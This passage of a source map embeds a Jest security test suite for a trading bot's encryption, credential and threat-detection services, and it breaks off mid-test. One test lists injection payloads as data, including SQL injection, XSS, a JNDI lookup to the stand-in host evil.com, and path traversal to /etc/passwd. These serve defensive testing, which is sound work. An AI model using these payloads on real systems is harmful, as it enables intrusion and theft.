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","names":[],"sources":["C:\\Users\\Nick\\Desktop\\SmoothSail\\src\\tests\\security\\security-penetration.test.ts"],"sourcesContent":["/**\r\n * Security and Penetration Testing Suite\r\n * \r\n * Comprehensive security testing including penetration testing,\r\n * vulnerability scanning, and security compliance validation.\r\n * \r\n * Requirements: 25.7 - Security compliance testing and validation\r\n */\r\n\r\nimport { ThreatDetectionEngine } from '@/security/threat-detection-engine';\r\nimport { EncryptionService } from '@/security/encryption-service';\r\nimport { SecurityMonitoringService } from '@/security/security-monitoring-service';\r\nimport { IncidentResponseService } from '@/security/incident-response-service';\r\nimport { CredentialManager } from '@/security/credential-manager';\r\nimport { AuditService } from '@/security/audit-service';\r\nimport crypto from 'crypto';\r\n\r\n// Mock external dependencies\r\njest.mock('@/core/logging/logger', () => ({\r\n  logger: {\r\n    info: jest.fn(),\r\n    debug: jest.fn(),\r\n    warn: jest.fn(),\r\n    error: jest.fn()\r\n  }\r\n}));\r\n\r\ndescribe('Security and Penetration Testing', () => {\r\n  let threatDetection: ThreatDetectionEngine;\r\n  let securityMonitoring: SecurityMonitoringService;\r\n  let incidentResponse: IncidentResponseService;\r\n  let auditService: AuditService;\r\n\r\n  beforeEach(() => {\r\n    // Set up test environment with master key\r\n    process.env.MASTER_ENCRYPTION_KEY = crypto.randomBytes(32).toString('hex');\r\n    \r\n    threatDetection = new ThreatDetectionEngine();\r\n    securityMonitoring = new SecurityMonitoringService();\r\n    incidentResponse = new IncidentResponseService();\r\n    auditService = new AuditService();\r\n  });\r\n\r\n  afterEach(() => {\r\n    delete process.env.MASTER_ENCRYPTION_KEY;\r\n  });\r\n\r\n  describe('Encryption Security Testing', () => {\r\n    let encryptionService: EncryptionService;\r\n\r\n    beforeEach(() => {\r\n      encryptionService = new EncryptionService();\r\n    });\r\n\r\n    it('should resist brute force attacks on encrypted data', async () => {\r\n      const sensitiveData = 'GATE_IO_API_KEY=super_secret_key_12345';\r\n      const encrypted = await encryptionService.encryptData(sensitiveData);\r\n\r\n      // Attempt brute force with common passwords\r\n      const commonPasswords = [\r\n        'password', '123456', 'admin', 'root', 'test',\r\n        'password123', 'admin123', 'qwerty', 'letmein',\r\n        'welcome', 'monkey', 'dragon', 'master', 'shadow'\r\n      ];\r\n\r\n      let successfulDecryptions = 0;\r\n      \r\n      for (const password of commonPasswords) {\r\n        try {\r\n          await encryptionService.decryptData(encrypted, password);\r\n          successfulDecryptions++;\r\n        } catch (error) {\r\n          // Expected to fail - this is good\r\n        }\r\n      }\r\n\r\n      // Should not be able to decrypt with any common password\r\n      expect(successfulDecryptions).toBe(0);\r\n    });\r\n\r\n    it('should detect tampering attempts on encrypted data', async () => {\r\n      const originalData = 'sensitive_trading_data';\r\n      const encrypted = await encryptionService.encryptData(originalData);\r\n\r\n      // Tamper with different parts of encrypted data\r\n      const tamperingAttempts = [\r\n        // Modify encrypted data\r\n        { ...encrypted, encryptedData: encrypted.encryptedData.slice(0, -4) + 'XXXX' },\r\n        // Modify IV\r\n        { ...encrypted, iv: encrypted.iv.slice(0, -4) + 'YYYY' },\r\n        // Modify auth tag\r\n        { ...encrypted, authTag: encrypted.authTag.slice(0, -4) + 'ZZZZ' },\r\n        // Modify salt\r\n        { ...encrypted, salt: encrypted.salt.slice(0, -4) + 'AAAA' },\r\n        // Modify algorithm\r\n        { ...encrypted, algorithm: 'aes-128-gcm' },\r\n        // Modify timestamp\r\n        { ...encrypted, timestamp: encrypted.timestamp + 1000000 }\r\n      ];\r\n\r\n      let detectedTampering = 0;\r\n\r\n      for (const tamperedData of tamperingAttempts) {\r\n        try {\r\n          await encryptionService.decryptData(tamperedData);\r\n          // If decryption succeeds, tampering was not detected (bad)\r\n        } catch (error) {\r\n          detectedTampering++;\r\n          // Expected to fail - tampering detected (good)\r\n        }\r\n      }\r\n\r\n      // Should detect all tampering attempts\r\n      expect(detectedTampering).toBe(tamperingAttempts.length);\r\n    });\r\n\r\n    it('should validate key derivation security', async () => {\r\n      const testData = 'test_data_for_key_derivation';\r\n      const weakPasswords = ['a', '12', 'abc', '1234'];\r\n      const strongPassword = 'StrongP@ssw0rd!2024#TradingBot$Secure';\r\n\r\n      // Test with weak passwords\r\n      for (const weakPassword of weakPasswords) {\r\n        const encrypted = await encryptionService.encryptData(testData, weakPassword);\r\n        const decrypted = await encryptionService.decryptData(encrypted, weakPassword);\r\n        \r\n        expect(decrypted).toBe(testData);\r\n        \r\n        // Verify that wrong password fails\r\n        try {\r\n          await encryptionService.decryptData(encrypted, weakPassword + 'wrong');\r\n          fail('Should not decrypt with wrong password');\r\n        } catch (error) {\r\n          // Expected to fail\r\n        }\r\n      }\r\n\r\n      // Test with strong password\r\n      const strongEncrypted = await encryptionService.encryptData(testData, strongPassword);\r\n      const strongDecrypted = await encryptionService.decryptData(strongEncrypted, strongPassword);\r\n      \r\n      expect(strongDecrypted).toBe(testData);\r\n    });\r\n\r\n    it('should resist timing attacks', async () => {\r\n      const correctPassword = 'correct_password_123';\r\n      const testData = 'timing_attack_test_data';\r\n      const encrypted = await encryptionService.encryptData(testData, correctPassword);\r\n\r\n      // Test with passwords of different lengths\r\n      const testPasswords = [\r\n        'a',                    // 1 char\r\n        'ab',                   // 2 chars\r\n        'abc',                  // 3 chars\r\n        'abcd',                 // 4 chars\r\n        'correct_password_12',  // 19 chars (close to correct)\r\n        'correct_password_123', // 20 chars (correct)\r\n        'wrong_password_12345', // 20 chars (wrong but same length)\r\n        'very_long_wrong_password_that_is_much_longer' // Much longer\r\n      ];\r\n\r\n      const timings: number[] = [];\r\n\r\n      for (const password of testPasswords) {\r\n        const startTime = process.hrtime.bigint();\r\n        \r\n        try {\r\n          await encryptionService.decryptData(encrypted, password);\r\n        } catch (error) {\r\n          // Expected to fail for wrong passwords\r\n        }\r\n        \r\n        const endTime = process.hrtime.bigint();\r\n        const duration = Number(endTime - startTime) / 1000000; // Convert to milliseconds\r\n        timings.push(duration);\r\n      }\r\n\r\n      // Calculate timing variance\r\n      const avgTiming = timings.reduce((sum, time) => sum + time, 0) / timings.length;\r\n      const variance = timings.reduce((sum, time) => sum + Math.pow(time - avgTiming, 2), 0) / timings.length;\r\n      const stdDev = Math.sqrt(variance);\r\n      const coefficientOfVariation = stdDev / avgTiming;\r\n\r\n      // Timing should be relatively consistent (CV < 0.5)\r\n      expect(coefficientOfVariation).toBeLessThan(0.5);\r\n    });\r\n  });\r\n\r\n  describe('Authentication and Authorization Testing', () => {\r\n    let credentialManager: CredentialManager;\r\n\r\n    beforeEach(() => {\r\n      credentialManager = new CredentialManager();\r\n    });\r\n\r\n    it('should prevent credential injection attacks', async () => {\r\n      const maliciousInputs = [\r\n        \"'; DROP TABLE credentials; --\",\r\n        '<script>alert(\"xss\")</script>',\r\n        '${jndi:ldap://evil.com/a}',\r\n        '../../../etc/passwd',\r\n        'admin\\' OR \\'1\\'=\\'1',\r\n        '${7*7}',\r\n        '{{7*7}}',\r\n        'javascript:alert(1)',\r\n        'data:text/html,<script>alert(1)</script>'\r\n      ];\r\n\r\n      for (const maliciousInput of maliciousInputs) {\r\n        try {\r\n          // Attempt to use malicious input as credential\r\n          await credentialManager.encryptCredential(maliciousInput);\r\n          \r\n          // Should not execute any malicious code\r\n          expect(true).toBe(true); // If we reach here, no code execution occurred\r\n        } catch (error) {\r\n          // Errors are acceptable as long as no code execution occurs\r\n          expect(error.message).not.toContain('DROP TABLE');\r\n          expect(error.message).not.toContain('alert');\r\n        }\r\n      }\r\n    });\r\n\r\n    it('should enforce secure credential storage', async () => {\r\n      const testCredentials = {\r\n        apiKey: 'test_api_key_12345',\r\n        secretKey: 'test_secret_key_67890',\r\n        passphrase: 'test_passphrase'\r\n      };\r\n\r\n      // Encrypt credentials\r\n      const encryptedApiKey = await credentialManager.encryptCredential(testCredentials.apiKey);\r\n      const encryptedSecretKey = await credentialManager.encryptCredential(testCredentials.secretKey);\r\n      const encryptedPassphrase = await credentialManager.encryptCredential(testCredentials.passphrase);\r\n\r\n      // Verify credentials are encrypted (not plaintext)\r\n      expect(encryptedApiKey).not.toBe(testCredentials.apiKey);\r\n      